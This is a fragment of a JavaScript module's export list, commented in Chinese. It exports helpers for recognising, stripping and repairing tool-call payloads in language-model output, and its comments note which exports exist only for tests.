  // 单一来源的负载形状谓词与开端识别器：残渣检测、合成开端、测试共用同一份。
  isLeakedToolPayloadShape,
  matchToolCallOpening,
  normalizeAllowedToolNames,
  ANSWER_PHASES,
  serializeToolArguments,
  // 控制字符修复导出仅供测试钉住"合法 JSON 是不动点"的不变式。
  escapeRawControlCharsInStrings,
  // 交付层残渣剥离：文本减去解析器登记的被定罪 span（绝无第二套独立扫描）。
  stripToolCallResidue,
  // 引号修复导出仅供测试钉住确定性与"合法 JSON 是不动点"的不变式。
  repairLooseToolPayload
};
